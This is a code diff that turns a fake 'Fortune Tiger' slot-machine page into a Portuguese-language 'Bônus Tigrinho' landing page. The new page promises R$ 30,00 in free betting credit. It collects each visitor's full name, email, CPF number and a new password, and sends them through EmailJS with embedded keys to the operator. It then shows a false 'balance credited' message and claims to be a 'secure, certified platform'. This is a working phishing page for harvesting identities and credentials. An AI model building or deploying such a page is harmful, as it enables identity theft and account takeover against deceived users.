@@ -3,181 +3,261 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fortune Tiger - Jogue Agora</title>
+    <title>Bônus Tigrinho - Ganhe R$ 30,00</title>
+    <!-- Importa a biblioteca do EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            // SUBSTITUA PELA SUA PUBLIC KEY DO EMAILJS
+            emailjs.init("dE244dq8weZCu5CiA");
+        })();
+    </script>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
+
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #ff9900, #ffcc00);
+            background: linear-gradient(135deg, #1a0b2e, #4a148c);
+            font-family: 'Poppins', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            color: #333;
+            color: #fff;
+            overflow: hidden;
         }
 
-        .container {
-            background-color: rgba(255, 255, 255, 0.95);
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        /* Efeito de partículas de ouro no fundo */
+        .particle {
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background: gold;
+            border-radius: 50%;
+            animation: float 5s infinite ease-in-out;
+            opacity: 0.6;
+        }
+        @keyframes float {
+            0% { transform: translateY(0) scale(1); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(-100vh) scale(0); opacity: 0; }
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             width: 320px;
             text-align: center;
+            position: relative;
+            z-index: 10;
         }
 
-        h1 {
-            color: #d4af37; /* Cor dourada */
-            margin-bottom: 10px;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        .badge {
+            background: linear-gradient(45deg, #ff0000, #ff6600);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.4);
         }
 
-        .tiger-icon {
+        h2 {
+            margin: 10px 0 20px 0;
+            font-size: 24px;
+            color: #ffd700;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .tiger-anim {
             font-size: 60px;
-            margin: 10px 0;
+            animation: bounce 2s infinite;
+            display: block;
+            margin-bottom: 10px;
         }
 
-        .slots {
-            display: flex;
-            justify-content: center;
-            gap: 5px;
-            background: #333;
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .bonus-text {
+            background: rgba(0, 0, 0, 0.3);
             padding: 10px;
             border-radius: 10px;
             margin-bottom: 20px;
-            border: 3px solid #d4af37;
+            border: 1px solid #ffd700;
         }
-
-        .slot {
-            width: 60px;
-            height: 60px;
-            background-color: #fff;
-            border-radius: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            font-weight: bold;
-        }
-
-        button {
-            background: linear-gradient(to bottom, #ffcc00, #ff9900);
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
+        .bonus-text strong {
+            color: #00ff00;
             font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 4px 0 #cc7a00;
-            transition: transform 0.1s;
-            width: 100%;
-            margin-bottom: 15px;
-        }
-
-        button:active {
-            transform: translateY(4px);
-            box-shadow: none;
-        }
-
-        .form-section {
-            text-align: left;
-            margin-top: 20px;
-            border-top: 1px solid #ddd;
-            padding-top: 15px;
         }
 
         input {
             width: 100%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            font-size: 14px;
             box-sizing: border-box;
+            transition: 0.3s;
         }
 
-        .btn-register {
-            background: #28a745;
-            box-shadow: 0 4px 0 #1e7e34;
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px #ffd700;
+            transform: scale(1.02);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(45deg, #ffcc00, #ff9900);
+            color: #000;
+            font-weight: 800;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px #ffcc00;
+        }
+
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .loader {
+            display: none;
+            width: 100%;
+            height: 4px;
+            background: #ddd;
+            margin-top: 10px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .loader-bar {
+            height: 100%;
+            width: 0%;
+            background: #00ff00;
+            transition: width 2s ease;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #aaa;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="tiger-icon">🐯</div>
-        <h1>Fortune Tiger</h1>
+    <!-- Partículas de fundo -->
+    <div id="particles"></div>
+
+    <div class="card">
+        <div class="badge">OFERTA EXCLUSIVA</div>
+        <div class="tiger-anim">🐯</div>
+        <h2>Fortune Tiger</h2>
         
-        <!-- Área do Jogo -->
-        <div class="slots" id="slots">
-            <div class="slot">🍊</div>
-            <div class="slot">🍊</div>
-            <div class="slot">🍊</div>
+        <div class="bonus-text">
+            Ganhe <strong>R$ 30,00</strong> grátis para apostar!
         </div>
 
-        <button onclick="spin()">GIRAR 🎰</button>
-        <p id="result" style="height: 20px; color: red; font-weight: bold;"></p>
-
-        <!-- Formulário de Cadastro -->
-        <div class="form-section">
-            <p><strong>Cadastre-se para sacar:</strong></p>
+        <form id="tigrinhoForm">
+            <input type="text" name="name" placeholder="Nome Completo" required>
+            <input type="email" name="email" placeholder="Seu Melhor E-mail" required>
+            <input type="tel" name="cpf" placeholder="CPF (000.000.000-00)" required pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" title="Formato: 000.000.000-00">
+            <input type="password" name="password" placeholder="Crie uma Senha Forte" required>
             
-            <!-- Configuração do FormSubmit -->
-            <!-- Substitua SEU_EMAIL@AQUI pelo seu email real -->
-            <form action="https://formsubmit.co/SEU_EMAIL@AQUI" method="POST">
-                <input type="hidden" name="_subject" value="Novo Cadastro Tigrinho!">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="https://google.com">
+            <button type="submit" id="btnSubmit">RESGATAR R$ 30,00</button>
+            
+            <div class="loader">
+                <div class="loader-bar" id="loaderBar"></div>
+            </div>
+            <p id="msg" style="font-size: 12px; margin-top: 10px; height: 15px;"></p>
+        </form>
+    </div>
 
-                <label>Nome Completo:</label>
-                <input type="text" name="nome" required placeholder="Seu nome">
-
-                <label>CPF:</label>
-                <input type="text" name="cpf" required placeholder="000.000.000-00">
-
-                <label>E-mail:</label>
-                <input type="email" name="email" required placeholder="seu@email.com">
-
-                <label>Telefone:</label>
-                <input type="tel" name="telefone" required placeholder="(00) 00000-0000">
-
-                <button type="submit" class="btn-register">CADASTRAR E SACAR</button>
-            </form>
-        </div>
+    <div class="footer">
+        Plataforma segura e certificada © 2026
     </div>
 
     <script>
-        function spin() {
-            const symbols = ['🍊', '🍯', '🐯', '🧧', '💎', '🍒'];
-            const slots = document.querySelectorAll('.slot');
-            const resultText = document.getElementById('result');
+        // Gera partículas douradas
+        const particlesContainer = document.getElementById('particles');
+        for(let i=0; i<30; i++) {
+            const p = document.createElement('div');
+            p.classList.add('particle');
+            p.style.left = Math.random() * 100 + 'vw';
+            p.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            p.style.animationDelay = Math.random() * 5 + 's';
+            particlesContainer.appendChild(p);
+        }
+
+        // Lógica do Formulário
+        const form = document.getElementById('tigrinhoForm');
+        const btn = document.getElementById('btnSubmit');
+        const loader = document.getElementById('loaderBar');
+        const msg = document.getElementById('msg');
+
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
             
-            resultText.innerText = "Girando...";
+            btn.disabled = true;
+            btn.innerText = "PROCESSANDO...";
+            loader.style.display = 'block';
             
-            // Animação simples
-            let interval = setInterval(() => {
-                slots.forEach(slot => {
-                    slot.innerText = symbols[Math.floor(Math.random() * symbols.length)];
-                });
+            // Simula carregamento visual
+            setTimeout(() => {
+                loader.style.width = '100%';
             }, 100);
 
-            setTimeout(() => {
-                clearInterval(interval);
-                // Define um resultado aleatório final
-                slots.forEach(slot => {
-                    slot.innerText = symbols[Math.floor(Math.random() * symbols.length)];
-                });
-                
-                // Simula vitória ou derrota
-                const isWin = Math.random() > 0.5;
-                if (isWin) {
-                    resultText.innerText = "Você ganhou! Cadastre-se para sacar.";
-                    resultText.style.color = "green";
-                } else {
-                    resultText.innerText = "Não foi dessa vez...";
-                    resultText.style.color = "red";
-                }
-            }, 1500);
-        }
-    </script>
+            // Configura EmailJS
+            const serviceID = 'service_1tsipns'; 
+            const templateID = 'template_38m07j9';
 
+            emailjs.sendForm(serviceID, templateID, this)
+                .then(() => {
+                    loader.style.background = '#00ff00';
+                    msg.innerText = "Sucesso! Verifique seu e-mail.";
+                    msg.style.color = "#00ff00";
+                    btn.innerText = "CADASTRADO!";
+                    
+                    // Opcional: Redirecionar para a "loja" do jogo após 2 segundos
+                    setTimeout(() => {
+                        // window.location.href = "link_do_seu_jogo_aqui.html";
+                        alert("Parabéns! Seu saldo de R$ 30,00 foi creditado. Redirecionando...");
+                    }, 1500);
+
+                }, (err) => {
+                    loader.style.background = '#ff0000';
+                    msg.innerText = "Erro ao cadastrar. Tente novamente.";
+                    msg.style.color = "red";
+                    btn.disabled = false;
+                    btn.innerText = "RESGATAR";
+                    console.log(JSON.stringify(err));
+                });
+        });
+    </script>
 </body>
 </html>
